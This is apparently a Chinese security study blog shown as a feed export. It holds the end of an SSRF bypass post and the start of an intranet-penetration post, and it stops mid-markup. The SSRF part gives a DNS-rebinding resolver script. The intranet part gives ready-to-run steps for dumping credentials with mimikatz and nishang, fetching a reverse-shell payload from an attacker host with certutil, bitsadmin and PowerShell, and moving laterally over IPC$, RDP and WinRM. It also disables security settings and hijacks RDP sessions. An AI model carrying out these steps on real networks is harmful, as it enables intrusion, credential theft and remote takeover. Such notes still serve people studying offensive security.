<p>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </p>
<p>在浏览器使用的时候就可以正常识别</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412215511590.png"
                      alt="image-20230412215511590"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412215422527.png"
                      alt="image-20230412215422527"
                ></p>
<h6 id="URL十六进制编码"><a href="#URL十六进制编码" class="headerlink" title="URL十六进制编码"></a>URL十六进制编码</h6><p>URL十六进制编码可以被浏览器正常的识别</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412220233457.png"
                      alt="image-20230412220233457"
                ></p>
<h6 id="利用网址缩短"><a href="#利用网址缩短" class="headerlink" title="利用网址缩短"></a>利用网址缩短</h6><p>利用网址缩短的网站进行在线缩短</p>
<p><a class="link"   href="https://www.baidu.com/" >https://www.baidu.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412220551851.png"
                      alt="image-20230412220551851"
                ></p>
<h6 id="利用30X重定向"><a href="#利用30X重定向" class="headerlink" title="利用30X重定向"></a>利用30X重定向</h6><p>可以利用重定向来让服务器访问目标地址，可用于重定向HTTP状态码：300 301 302 303 304 305 306 307 308</p>
<p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可以条状到内网中</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">header(&quot;Location: http://192.168.1.10&quot;);</span><br><span class="line">exit(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>具体不太清楚</p>
<h6 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h6><p>配置域名的DNS解析到目标地址如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup 127.0.0.1.nip.io</span><br><span class="line">nslookup owasp.org.127.0.0.1.nip.io</span><br></pre></td></tr></table></figure></div>

<p>其中还有一个xip.io是一个开源的泛域名服务，会把如下域名解析到特定的地址，和DNS解析差不多</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">www.10.0.0.1.xip.io= 10.0.0.1</span><br><span class="line">http://mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">foo.http://bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">10.0.0.1.xip.name resolves to 10.0.0.1</span><br><span class="line">www.10.0.0.2.xip.name resolves to 10.0.0.2</span><br><span class="line">foo.10.0.0.3.xip.name resolves to 10.0.0.3</span><br><span class="line">bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</span><br></pre></td></tr></table></figure></div>

<h6 id="DNS重绑定（DNS-Rebinding）"><a href="#DNS重绑定（DNS-Rebinding）" class="headerlink" title="DNS重绑定（DNS Rebinding）"></a>DNS重绑定（DNS Rebinding）</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413164656866.png"
                      alt="image-20230413164656866"
                ></p>
<p>流程图中：对于用户的请求URL参数，首先服务器端会对其进行dns解析，然后返回解析过的域名，绕过不合法就丢弃，之后还会有一个URL请求</p>
<p>主要的原理就是利用这两次URL请求的时间差，来进行攻击的</p>
<p>利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候访问我们真正想要访问的内网IP就可以了</p>
<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名解析指定到我们自己的DNS Server，这样我们才可以编写解析服务，设置TTL时间为0（就是保存缓存的时间为0），这是为了防止有DNS服务器对第一次解析结果进行缓存</p>
<p>攻击流程</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器获得了URL参数，进行了第一次DNS解析，获得了一个非内网的IP</span><br><span class="line">对于获得的IP进行判断，发现这个是指定范围的IP，通过</span><br><span class="line">然后服务器端对URL进行访问，TTL设置为0，所以再次进行DNS解析，返回内网IP</span><br><span class="line">第一次的验证已经绕过，所以服务器端返回的就是内网的资源内容</span><br></pre></td></tr></table></figure></div>

<p>把同一个域名绑定到两个不同的IP地址，这就是两条A记录</p>
<p>但是这种具有随机性，你不太能可控，要取到第一次是外网IP，第二次是内网IP的可能组合有1&#x2F;4的概率</p>
<p>所以还有更好的方法，自己搭建一个DNS服务器</p>
<p>有一个A记录和一个NS记录</p>
<p>NS记录表示域名test.bendawang.site这个指定由ns.bendawang.site这个域名服务器来解析，然后A记录表示ns.bendawang.site的位置在IP104.160.43.154上</p>
<p>这需要我们自己搭建一个dns服务器</p>
<p>采用python的twisted库中的name模块就行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from twisted.internet import reactor, defer</span><br><span class="line">from twisted.names import client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&amp;#123;&amp;#125;</span><br><span class="line"></span><br><span class="line">class DynamicResolver(object):</span><br><span class="line"></span><br><span class="line">    def _doDynamicResponse(self, query):</span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        if name not in record or record[name]&lt;1:</span><br><span class="line">            ip=&quot;104.160.43.154&quot;</span><br><span class="line">        else:</span><br><span class="line">            ip=&quot;171.18.0.2&quot;</span><br><span class="line"></span><br><span class="line">        if name not in record:</span><br><span class="line">            record[name]=0</span><br><span class="line">        record[name]+=1</span><br><span class="line"></span><br><span class="line">        print name+&quot; ===&gt; &quot;+ip</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=0,</span><br><span class="line">            payload=dns.Record_A(address=b&#x27;%s&#x27;%ip,ttl=0)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        return answers, authority, additional</span><br><span class="line"></span><br><span class="line">    def query(self, query, timeout=None):</span><br><span class="line">        return defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=&#x27;/etc/resolv.conf&#x27;)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(53, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    raise SystemExit(main())</span><br></pre></td></tr></table></figure></div>

<p>打包成 .py文件然后运行就行了</p>
<p>然后<code>dig test.bendawang.site</code></p>
<p>有一个在线的URL重绑定工具，第一种方法</p>
<p><code>https://lock.cmpxchg8b.com/rebinder.html</code></p>
<h4 id="SSRF工具"><a href="#SSRF工具" class="headerlink" title="SSRF工具"></a>SSRF工具</h4><h6 id="SSRF-Testing，绕过测试工具"><a href="#SSRF-Testing，绕过测试工具" class="headerlink" title="SSRF-Testing，绕过测试工具"></a>SSRF-Testing，绕过测试工具</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413173902801.png"
                      alt="image-20230413173902801"
                ></p>
<h6 id="SSRFmap"><a href="#SSRFmap" class="headerlink" title="SSRFmap"></a>SSRFmap</h6><p>这个工具可以根据模块来发送exp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413173558180.png"
                      alt="image-20230413173558180"
                ></p>
]]></content>
  </entry>
  <entry>
    <title>内网安全</title>
    <url>/2023/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h2 id="基本认知"><a href="#基本认知" class="headerlink" title="基本认知"></a>基本认知</h2><h3 id="网站拓扑"><a href="#网站拓扑" class="headerlink" title="网站拓扑"></a>网站拓扑</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228154128442.png"
                      alt="image-20230228154128442"
                ></p>
<p>一般来说向外部提供服务的服务器存放于DMZ之中（如web服务器），其余较为核心的服务器在内网</p>
<h3 id="局域网、工作组、域环境"><a href="#局域网、工作组、域环境" class="headerlink" title="局域网、工作组、域环境"></a>局域网、工作组、域环境</h3><p>一般来说工作组和域环境的区别就是规模大小的局域网</p>
<p>工作组不存在管理主机，域环境存在便于管理，两者的攻击手法不同</p>
<h4 id="域控制器DC就是所谓的管理主机"><a href="#域控制器DC就是所谓的管理主机" class="headerlink" title="域控制器DC就是所谓的管理主机"></a>域控制器DC就是所谓的管理主机</h4><h4 id="活动目录AD"><a href="#活动目录AD" class="headerlink" title="活动目录AD"></a>活动目录AD</h4><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>分为</p>
<p>单域：只有一个域环境</p>
<p>父子域：相当于子公司和母公司的区别</p>
<p>​	注意：linux系统可以是域控制器，但是功能会比win系统少，且难以管理，所以一般来说域控制器都是用win的系统来实现，linux一般用作服务器</p>
<p>域的组成</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228160643006.png"
                      alt="image-20230228160643006"
                ></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>作用：为了了解到当前服务器的计算机的基本信息，为后续判断都武器角色，网络     环境等做准备。</p>
<p>systeminfo  查看当前已经取得权限主机的详细信息</p>
<p>net start  查看启动的服务</p>
<p>tasklist   进程列表</p>
<p>schtasks 计划任务</p>
<p>判断是否存在域：</p>
<p>ipconfig&#x2F;all</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228163534013.png"
                      alt="image-20230228163534013"
                ></p>
<p>net view &#x2F;domain</p>
<p>判断主域（获取域控的地址）</p>
<p>net time &#x2F;domain</p>
<p>判断当前网络端口开放</p>
<p>netstat -ano</p>
<p>域名 追踪来源地址</p>
<p>nslookup</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228164903139.png"
                      alt="image-20230228164903139"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228165049553.png"
                      alt="image-20230228165049553"
                ></p>
<h3 id="凭据信息收集"><a href="#凭据信息收集" class="headerlink" title="凭据信息收集"></a>凭据信息收集</h3><p>为了收集各种密文、明文、口令等，为后续的横向渗透做好准备</p>
<h4 id="mimikatz（适用于win）的使用"><a href="#mimikatz（适用于win）的使用" class="headerlink" title="mimikatz（适用于win）的使用"></a>mimikatz（适用于win）的使用</h4><p>可以使用该工具收集用户的账号和密码信息，但是域用户会有权限限制该工具的使用，这时候就涉及提权操作，如下图</p>
<p>管理员方式  运行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228225649556.png"
                      alt="image-20230228225649556"
                ></p>
<h4 id="LaZagne（all），XenArmor（win）"><a href="#LaZagne（all），XenArmor（win）" class="headerlink" title="LaZagne（all），XenArmor（win）"></a>LaZagne（all），XenArmor（win）</h4><h4 id="计算机各种协议服务口令获取（获取本地计算机的各种软件密码）"><a href="#计算机各种协议服务口令获取（获取本地计算机的各种软件密码）" class="headerlink" title="计算机各种协议服务口令获取（获取本地计算机的各种软件密码）"></a>计算机各种协议服务口令获取（获取本地计算机的各种软件密码）</h4><h2 id="后续探针"><a href="#后续探针" class="headerlink" title="后续探针"></a>后续探针</h2><h4 id="探针域控制器及地址信息"><a href="#探针域控制器及地址信息" class="headerlink" title="探针域控制器及地址信息"></a>探针域控制器及地址信息</h4><p>信息收集讲过</p>
<h4 id="探针域内存活主机及地址信息"><a href="#探针域内存活主机及地址信息" class="headerlink" title="探针域内存活主机及地址信息"></a>探针域内存活主机及地址信息</h4><p> nbtscan 192.168.3.0&#x2F;24 第三方工具，不推荐，可能被杀</p>
<p>for &#x2F;L %I in (1,1,254) Do @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”   自带命令探寻主机</p>
<h5 id="powershell脚本nishang工具"><a href="#powershell脚本nishang工具" class="headerlink" title="powershell脚本nishang工具"></a>powershell脚本nishang工具</h5><p>  —导入模块 nishang：Import-Module .\nishang.psm1</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/eb5ba3f79d96eb0da2f8ed1d3bdc394277e99a40.png@831w_122h_progressive.webp"
                      alt="img"
                ></p>
<p>#设置执行策略（第一次运行先设置执行策略，这里还是权限不够）</p>
<p>—Set-ExecutionPolicy RemoteSigned</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9deacbf8ab0e310f7b0d09f0562d35d754dff5e2.png@831w_249h_progressive.webp"
                      alt="img"
                ></p>
<p>—以管理员运行powershell，注意这里的密码是DC的密码才行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/18d929307e6e535f289dc3c0c23c6a43b948ddfd.png@831w_335h_progressive.webp"
                      alt="img"
                ></p>
<p>—设置执行策略（首次执行nishang）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9cc6070cb110b2453cdb03faef7384e604d67304.png@831w_162h_progressive.webp"
                      alt="img"
                ></p>
<p>—导入模块</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/41ad41f293fa81f4ce4bf390c57f341530a7e8a0.png@831w_189h_progressive.webp"
                      alt="img"
                ></p>
<p>#获取模块 nishang 的命令函数</p>
<p>—Get-Command -Module nishang（每个参数对应一个功能模块）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/65b8cd453110a0bcc587ae3f5c172eadbfcc4a9a.png@831w_243h_progressive.webp"
                      alt="img"
                ></p>
<p>—调用Invoke-Mimikatz的功能（查询本地windows账号密码）</p>
<p>—这里发现了域控（Administrator）的密码、域用户（webadmin）密码和本地管理员用户（Administrator）密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/47773cafd9fafa040b26a7558a9dd85baf3db1fa.png@831w_392h_progressive.webp"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/16710e3db0474f31cc7fe2a29a431bb18250f1db.png@698w_299h_progressive.webp"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/05194c13133762cdee5b81012974ee3405ce88ab.png@831w_393h_progressive.webp"
                      alt="img"
                >![img](<a class="link"   href="https://i0.hdslb.com/bfs/article/c322ba11203e97845861f74e5bb6003616e6e1e0.png@831w_386h_progressive.webp" >https://i0.hdslb.com/bfs/article/c322ba11203e97845861f74e5bb6003616e6e1e0.png@831w_386h_progressive.webp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>#获取常规计算机信息：Get-Information</p>
<p>—登录用户</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/c322ba11203e97845861f74e5bb6003616e6e1e0.png@831w_386h_progressive.webp"
                      alt="img"
                ></p>
<p>—安装的应用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9b52aa996b4c90817f4769d5adb931cc67cc64f6.png@831w_417h_progressive.webp"
                      alt="img"
                ></p>
<p>—启用的服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/fd6cee535ee4bd239ea92d167a0bd8597f0e769d.png@725w_216h_progressive.webp"
                      alt="img"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301132837623.png"
                      alt="image-20230301132837623"
                ></p>
<p>Invoke-Portscan -startAddress 192.168.3.0  -EndAddress 192.168.3.100 -ResolveHost -ScanPort</p>
<p>Invoke-CredentialsPhish弹出密码登入框，不输对不给关</p>
<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="横向移动中的文件传输"><a href="#横向移动中的文件传输" class="headerlink" title="横向移动中的文件传输"></a>横向移动中的文件传输</h3><h4 id="通过网络共享"><a href="#通过网络共享" class="headerlink" title="通过网络共享"></a>通过网络共享</h4><p>Windows的网络共享功能能实现局域网之间的文件共享</p>
<p>执行net share可以开启网络共享，其中C$是C盘共享，Admin$是目录共享</p>
<h6 id="IPC-共享"><a href="#IPC-共享" class="headerlink" title="IPC$共享"></a>IPC$共享</h6><p>条件：远程主机开启了ipc连接        139和445端口要开放</p>
<p>执行</p>
<p><code>net use \\10.10.10.19\IPC$ &quot;Admin123&quot;  /user :&quot;Administrator&quot;</code>实现IPC连接</p>
<p><code>dir \\110.10.10.19</code>实现C盘共享目录</p>
<p><code>copy .\reverse_tcp.exe \\10.10.10.19\C$</code>复制文件到远程主机的C盘</p>
<p>使用其他的命令也可以达到不同的效果</p>
<p>如：<code>net use \\10.10.10.19\C$ &quot;Admin@123&quot; /user:&quot;Administrator&quot;</code>建立远程C$共享</p>
<h4 id="通过搭建SMB服务器"><a href="#通过搭建SMB服务器" class="headerlink" title="通过搭建SMB服务器"></a>通过搭建SMB服务器</h4><p>SMB又称CIFS（网络文件共享系统）</p>
<p>是计算机能共享文件、打印机、等资源，利用应用层tcp传输，端口139、445偏向445</p>
<p>可以在服务器中搭建SMB共享服务器，并将攻击载荷放入共享文件夹，使远程主机能够远程加载共享文件（主义使用匿名共享）</p>
<p>可以利用impacket中的smbserver.py来实现SMB服务器的搭建</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行以下命令即可</span><br><span class="line">mkdir  /root/share</span><br><span class="line">python smbserver.py evilsmb /root/share -smb2support</span><br></pre></td></tr></table></figure></div>

<p>对于Windows，已经获得管理员权限的可以直接手动配置一个SMB服务器</p>
<p>也可以通过Invoke-BuildAnonymousSMBServer在本地快速启动一个匿名共享。</p>
<h4 id="通过Windows自带的工具"><a href="#通过Windows自带的工具" class="headerlink" title="通过Windows自带的工具"></a>通过Windows自带的工具</h4><h6 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h6><p>是一个Windows自带的命令行工具，用于管理证书安装，提供了从网络下载文件的功能，可以先在服务器上部署攻击载荷然后下载下来</p>
<p>执行</p>
<p><code>certutil -urlcache -split -f http://你的IP:端口port/shell.exe C:\reverse_tcp.exe</code></p>
<p>通过Certutil下载shell.exe，并保存在C:\reverse_tcp.exe</p>
<h6 id="BITSAdmin"><a href="#BITSAdmin" class="headerlink" title="BITSAdmin"></a>BITSAdmin</h6><p>Bitsadmin是一个命令行工具可以用来创建、下载、上载作业，监视进度</p>
<p><code>bitsadmin \transfer test http://你的IP:端口port/shell.exe C:\reverse_tcp.exe</code></p>
<p>创建一个名为test的Bitsadmin任务，保存shell.exe到C:\reverse_tcp.exe</p>
<h6 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h6><p>可以利用WebClient来实现文件下载</p>
<p><code>(New-Object Net.WebClient).DownloadFile(&#39;http://你的IP:端口port/shell.exe&#39;,&#39;C:\reverse_tcp.exe&#39;)</code></p>
<h3 id="UAC-Remote-Restrictions"><a href="#UAC-Remote-Restrictions" class="headerlink" title="UAC Remote Restrictions"></a>UAC Remote Restrictions</h3><p>UAC是用户账户控制，这使计算机能以非管理员模式运行，本地中如何非RID 500的其他用户都以最小权限运行。</p>
<p>为了更好的保护属于本地管理员成员的用户，微软在Windows vista之后引入UAC Remote Restrictions远程限制</p>
<p>这个东西会导致schtasks、PsExec、WMI、WinRM、哈希传递攻击都只能使用RID 500的本地管理员用户，其他用户包括非RID 500的本地管理员用户都会提示“拒绝访问”</p>
<p>从而限制横向移动</p>
<p>关闭</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure></div>



<h3 id="远程桌面利用"><a href="#远程桌面利用" class="headerlink" title="远程桌面利用"></a>远程桌面利用</h3><p>查询是否开启远程桌面</p>
<p><code>reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\terminal Server&quot; /v fDenyTSConnections</code></p>
<p>0没启动 1启动</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#本地开启远程桌面功能</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line">#关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权）</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\terminal Server\WinStations\RDP-TCP&quot; /v UserAuthentication /t REG_Dword /d 0</span><br><span class="line">#设置防火墙策略放行3389端口</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line">#对于远程主机可以使用WMI来开启远程桌面</span><br><span class="line">wmic /Node:10.10.10.19 /User:Administrator /Pssword:Admin@123 RDTOGGLE WHERE ServerName=&#x27;WIN2016-WEB3&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure></div>

<h6 id="RDP-Hijacking"><a href="#RDP-Hijacking" class="headerlink" title="RDP Hijacking"></a>RDP Hijacking</h6><p>原理是，当有多个用户使用远程桌面时，就会产生多个RDP会话，并且可以在未授权的情况下成功登入目标系统，即使用户会话已经断开</p>
<p>需要获取SYSTEM权限，正常来说需要密码，但是已经获取了 SYSTEM权限就可以不用密码</p>
<p>操作：在Meterpreter中提权至SYSTEM权限后执行<code>tscon 9</code>即可</p>
<h6 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h6><p>SharpRDP是一款开源工具，需要3389端口，可以在远程主机上执行系统命令，不需要GUI</p>
<p>可以直接将SharpRDP上传到跳板机。然后获取用户凭据，对内网其他主机执行系统命令，就省去代理等中间环节</p>
<h3 id="WinRM的利用"><a href="#WinRM的利用" class="headerlink" title="WinRM的利用"></a>WinRM的利用</h3><h4 id="执行远程命令"><a href="#执行远程命令" class="headerlink" title="执行远程命令"></a>执行远程命令</h4><p>有两个命令工具：</p>
<p>1.Winrs远程执行命令 </p>
<p>远程管理的客户端程序，提供凭据即可运行，但需要双方都有winrm服务</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行以下命令，可以执行以下命令</span><br><span class="line">winrs -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123 &quot;whoami&quot;</span><br><span class="line">可以通过这个开启目标的cmd</span><br><span class="line">winrs -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123 &quot;cmd&quot;</span><br></pre></td></tr></table></figure></div>



<p>2.Winrm（.cmd）系统管理命令行工具</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过调用Win32_Process类中的Create方法来创建远程进程</span><br><span class="line">实战中可以执行一个攻击载荷</span><br><span class="line">winem invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck @&#123;commandline=&quot;notepad.exe&quot;&#125; -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123</span><br></pre></td></tr></table></figure></div>

<h4 id="利用WinRM获取交互式会话"><a href="#利用WinRM获取交互式会话" class="headerlink" title="利用WinRM获取交互式会话"></a>利用WinRM获取交互式会话</h4><h6 id="powershell利用"><a href="#powershell利用" class="headerlink" title="powershell利用"></a>powershell利用</h6><p>powershell的远程传输协议基于WinRM规范，且可以远程管理</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定远程的用户名</span><br><span class="line">$User = &quot;HACK-MY\Administrator&quot;</span><br><span class="line">指定用户密码</span><br><span class="line">$password = ConverTo-SecureString -String &quot;Admin@123&quot; -AsPlainText -Force</span><br><span class="line">将用户名和密码整合，以便导入Credential</span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password</span><br><span class="line">根据提供的凭据创建会话</span><br><span class="line">New-PSSession -Name（指定的创建会话名称） WinRM1 -ComputerName（指定要连接的主机IP或主机名） 10.10.10.19 -Credential（指定有权连接到远程主机的用户凭据） $Cred -Port（指定WinRM的工作端口） 5985</span><br></pre></td></tr></table></figure></div>

<p><code>Get-PSSession</code>查看当前已经创建的PSSession会话</p>
<p>选中一个会话并且执行<code>Enter-PSSession -Name WinRM1</code>进入会话交互模式</p>
<p>也可以通过Invoke-Command执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定远程的用户名</span><br><span class="line">$User = &quot;HACK-MY\Administrator&quot;</span><br><span class="line">指定用户密码</span><br><span class="line">$password = ConverTo-SecureString -String &quot;Admin@123&quot; -AsPlainText -Force</span><br><span class="line">将用户名和密码整合，以便导入Credential</span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password</span><br><span class="line">根据提供的凭据创建会话</span><br><span class="line">$Sess = New-PSSession -Name（指定的创建会话名称） WinRM1 -ComputerName（指定要连接的主机IP或主机名） 10.10.10.19 -Credential（指定有权连接到远程主机的用户凭据） $Cred -Port（指定WinRM的工作端口） 5985</span><br><span class="line">在创建的会话中执行命令</span><br><span class="line">Invoke-Command -Session $Sess -ScriptBlock &#123; dir c:\&#125;</span><br></pre></td></tr></table></figure></div>

<h6 id="Evil-Winrm"><a href="#Evil-Winrm" class="headerlink" title="Evil-Winrm"></a>Evil-Winrm</h6><p>Evil-winrm是一种基于Winrm Shell的渗透架构，可以通过提供用户名密码和哈希值在启用了WinRM服务的目标主机上完成的简单的攻击任务</p>
<h4 id="域横向批量at-amp-schtasks-amp-impacket"><a href="#域横向批量at-amp-schtasks-amp-impacket" class="headerlink" title="域横向批量at&amp;schtasks&amp;impacket"></a>域横向批量at&amp;schtasks&amp;impacket</h4><h5 id="横向渗透明文传递at-amp-schtasks"><a href="#横向渗透明文传递at-amp-schtasks" class="headerlink" title="横向渗透明文传递at&amp;schtasks"></a>横向渗透明文传递at&amp;schtasks</h5><p>在拿下一台内网主机之后，通过本地信息收集用户凭证信息之后，应该如何很横向渗透拿下更多的主机，这里就涉及到at&amp;schtasks命令的使用，在一直目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令</p>
<p>主要步骤：获取到某域主机权限-&gt;mimikatz得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表做字典 -&gt;用到密码明文当作密码字典-&gt;尝试连接–&gt;穿甲计划任务（at&amp;schtasks）-&gt;执行文件可为后门或者相关命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301145205438.png"
                      alt="image-20230301145205438"
                ></p>
<p>IPC建立失败原因</p>
<p>对方未开启139，445端口等</p>
<p>—dir \xx.xx.xx.xx\C$\ # 查看文件列表</p>
<p>—copy \xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件</p>
<p>—copy 1.bat \xx.xx.xx.xx\C$ # 复制文件</p>
<p>—net use \xx.xx.xx.xx\C$\1.bat &#x2F;del # 删除 IPC</p>
<p>—net view xx.xx.xx.xx # 查看对方共享</p>
<h6 id="at-lt-windows-2012"><a href="#at-lt-windows-2012" class="headerlink" title="at &lt; windows 2012"></a>at &lt; windows 2012</h6><p><img  
